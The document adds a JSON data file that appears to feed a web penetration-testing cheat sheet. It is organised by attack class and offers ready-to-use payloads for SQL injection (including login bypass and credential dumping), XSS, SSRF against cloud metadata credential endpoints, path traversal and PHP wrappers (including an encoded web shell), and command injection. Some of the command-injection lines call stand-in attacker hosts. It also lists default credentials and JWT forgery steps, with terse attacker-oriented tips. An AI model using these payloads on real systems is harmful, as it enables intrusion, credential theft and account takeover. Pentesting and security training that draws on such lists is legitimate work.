@@ -1,0 +1,278 @@
+[
+  {
+    "cat": "SQL Injection",
+    "icon": "\ud83d\udc89",
+    "color": "#dc2626",
+    "groups": [
+      {
+        "name": "Detection Probes",
+        "items": [
+          "'",
+          "\"",
+          "') OR ('1'='1",
+          "'; WAITFOR DELAY '0:0:3'--",
+          "'; SELECT sleep(3)--",
+          "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
+        ],
+        "notes": "Start with single quote. Error message OR time delay = likely injectable."
+      },
+      {
+        "name": "Union-Based",
+        "items": [
+          "' ORDER BY 1--",
+          "' ORDER BY 5--",
+          "' UNION SELECT NULL--",
+          "' UNION SELECT NULL,NULL,NULL--",
+          "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "' UNION SELECT username,password FROM users--"
+        ],
+        "notes": "Find column count with ORDER BY first. All NULLs until you find data types."
+      },
+      {
+        "name": "Blind Boolean",
+        "items": [
+          "' AND 1=1--",
+          "' AND 1=2--",
+          "' AND SUBSTRING(username,1,1)='a'--",
+          "' AND (SELECT COUNT(*) FROM users)>0--"
+        ],
+        "notes": "Compare true vs false page responses. Automate with SQLMap --technique=B"
+      },
+      {
+        "name": "Time-Based Blind",
+        "items": [
+          "'; IF(1=1) WAITFOR DELAY '0:0:5'-- (MSSQL)",
+          "'; SELECT CASE WHEN(1=1) THEN sleep(5) ELSE 0 END-- (MySQL)",
+          "'; SELECT pg_sleep(5)-- (PostgreSQL)",
+          "'; SELECT 1 FROM dual WHERE 1=1 AND sleep(5)-- (Oracle)"
+        ],
+        "notes": "Response > 5s = vulnerable. Use --technique=T in SQLMap for automation."
+      },
+      {
+        "name": "Authentication Bypass",
+        "items": [
+          "admin'--",
+          "admin' OR '1'='1",
+          "' OR 1=1#",
+          "' OR 'x'='x",
+          "admin'/*",
+          "') OR ('1'='1'--"
+        ],
+        "notes": "Login form bypass. Try in both username and password fields. Check for second-order injection too."
+      }
+    ]
+  },
+  {
+    "cat": "Cross-Site Scripting",
+    "icon": "\ud83d\udd27",
+    "color": "#ea580c",
+    "groups": [
+      {
+        "name": "Basic Probes",
+        "items": [
+          "<script>alert(document.domain)</script>",
+          "<img src=x onerror=alert(document.domain)>",
+          "<svg onload=alert(document.domain)>",
+          "<body onload=alert(1)>",
+          "javascript:alert(document.domain)"
+        ],
+        "notes": "Replace alert(1) with alert(document.domain) to prove same-origin execution. Show scope of impact."
+      },
+      {
+        "name": "Attribute Context",
+        "items": [
+          "\" onmouseover=alert(1) x=\"",
+          "' onmouseover=alert(1) x='",
+          "\" autofocus onfocus=alert(1) \"",
+          "\" style=animation-name:rotation onanimationstart=alert(1)//\""
+        ],
+        "notes": "Breaking out of HTML attribute context. Must terminate the attribute value first."
+      },
+      {
+        "name": "DOM-Based",
+        "items": [
+          "#<img src=x onerror=alert(1)>",
+          "#javascript:alert(1)",
+          "?search=<script>alert(1)</script>",
+          "location.hash.replace('#','')"
+        ],
+        "notes": "Check JavaScript that reads location.hash, document.URL, document.referrer. Source \u2192 Sink analysis in Burp."
+      },
+      {
+        "name": "Filter Bypass",
+        "items": [
+          "<ScRiPt>alert(1)</sCrIpT>",
+          "<img src=x OnErRoR=alert(1)>",
+          "<svg/onload=alert(1)>",
+          "<a href=javascript&colon;alert(1)>click",
+          "<details/open/ontoggle=alert(1)>"
+        ],
+        "notes": "WAF evasion. Use Burp Intruder + XSS payload list from SecLists. Check server-side encoding before output."
+      }
+    ]
+  },
+  {
+    "cat": "SSRF",
+    "icon": "\ud83c\udf10",
+    "color": "#b45309",
+    "groups": [
+      {
+        "name": "Internal Network",
+        "items": [
+          "http://127.0.0.1/",
+          "http://localhost:8080/admin",
+          "http://192.168.0.1/",
+          "http://10.0.0.1/",
+          "http://172.16.0.1/"
+        ],
+        "notes": "Probe for internal services behind firewall. Common targets: admin panels, monitoring, databases."
+      },
+      {
+        "name": "Cloud Metadata (Critical)",
+        "items": [
+          "http://169.254.169.254/latest/meta-data/ (AWS)",
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS IAM keys)",
+          "http://169.254.254.169/ (GCP)",
+          "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)",
+          "http://100.100.100.200/latest/meta-data/ (Alibaba)"
+        ],
+        "notes": "AWS metadata = IAM credentials = account takeover. Add header: Metadata-Flavor: Google for GCP."
+      },
+      {
+        "name": "Protocol Schemes",
+        "items": [
+          "file:///etc/passwd",
+          "file:///etc/shadow",
+          "file:///C:/Windows/win.ini",
+          "dict://localhost:11211/",
+          "gopher://localhost:25/",
+          "ftp://localhost:21/"
+        ],
+        "notes": "Try when http:// is blocked. file:// reads local files. gopher:// can send raw TCP to internal services."
+      }
+    ]
+  },
+  {
+    "cat": "LFI / Path Traversal",
+    "icon": "\ud83d\udcc1",
+    "color": "#16a34a",
+    "groups": [
+      {
+        "name": "Basic Traversal",
+        "items": [
+          "../../../etc/passwd",
+          "..\\..\\..\\Windows\\win.ini",
+          "....//....//....//etc/passwd",
+          "/%2e%2e/%2e%2e/etc/passwd",
+          "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+          "..%2f..%2f..%2fetc%2fpasswd"
+        ],
+        "notes": "Double encoding bypasses simple filters. Count directory depth needed. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini"
+      },
+      {
+        "name": "High-Value Files",
+        "items": [
+          "/etc/passwd",
+          "/etc/shadow",
+          "/etc/hosts",
+          "/proc/self/environ",
+          "/proc/self/cmdline",
+          "C:\\Windows\\System32\\drivers\\etc\\hosts",
+          "C:\\inetpub\\wwwroot\\web.config",
+          "C:\\xampp\\htdocs\\config.php"
+        ],
+        "notes": "After confirming LFI, immediately go for /proc/self/environ (may contain secrets) and application config files."
+      },
+      {
+        "name": "PHP Wrappers",
+        "items": [
+          "php://filter/convert.base64-encode/resource=index.php",
+          "php://filter/read=string.rot13/resource=index.php",
+          "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+          "expect://id",
+          "php://input (with POST data)"
+        ],
+        "notes": "php://filter reads source code as base64 without executing. data:// can lead to RCE if phar deserialization available."
+      }
+    ]
+  },
+  {
+    "cat": "Command Injection",
+    "icon": "\ud83d\udcbb",
+    "color": "#6366f1",
+    "groups": [
+      {
+        "name": "Injection Separators",
+        "items": [
+          "; id",
+          "| id",
+          "|| id",
+          "& id",
+          "&& id",
+          "`id`",
+          "$(id)",
+          "; id #",
+          "\n id"
+        ],
+        "notes": "Try all separators. Behavior varies by OS and shell. Use Burp Repeater to test each manually."
+      },
+      {
+        "name": "Blind Detection",
+        "items": [
+          "| sleep 10",
+          "& ping -n 10 127.0.0.1",
+          "| nslookup {BURP_COLLABORATOR}",
+          "$(curl http://{BURP_COLLABORATOR}/test)",
+          "| wget http://{ATTACKER_IP}:8080/test"
+        ],
+        "notes": "Use Burp Collaborator for out-of-band detection. Time-based: compare baseline vs sleep response time."
+      },
+      {
+        "name": "Filter Bypass",
+        "items": [
+          "cat /etc/pa'ss'wd",
+          "c''at /etc/passwd",
+          "/bin/cat /etc/passwd",
+          "\\cat /etc/passwd",
+          "$(printf '\\154\\163')  (ls in octal)",
+          "IFS=,;cmd=c,a,t;$cmd /etc/passwd"
+        ],
+        "notes": "When spaces or keywords are filtered. Use ${IFS} for spaces. Concatenation to bypass keyword filters."
+      }
+    ]
+  },
+  {
+    "cat": "Authentication Attacks",
+    "icon": "\ud83d\udd11",
+    "color": "#8b5cf6",
+    "groups": [
+      {
+        "name": "Default Credentials",
+        "items": [
+          "admin:admin",
+          "admin:password",
+          "root:root",
+          "admin:123456",
+          "admin:admin123",
+          "guest:guest",
+          "test:test",
+          "admin:(blank)",
+          "root:(blank)",
+          "administrator:password"
+        ],
+        "notes": "Always try defaults on every login. Internal systems, network gear, dev environments almost never change defaults."
+      },
+      {
+        "name": "JWT Attacks",
+        "items": [
+          "Change alg to 'none' \u2014 remove signature",
+          "Change alg from RS256 to HS256 \u2014 sign with public key",
+          "Brute force weak HS256 secret (hashcat -a 0 -m 16500)",
+          "Inject via kid parameter: ../../../dev/null",
+          "Set exp to far future (year 2099)"
+        ],
+        "notes": "Use jwt_tool: python3 jwt_tool.py {TOKEN} -T (tamper) or -C -d wordlist.txt (crack). None algorithm = no auth."
+      }
+    ]
+  }
+]
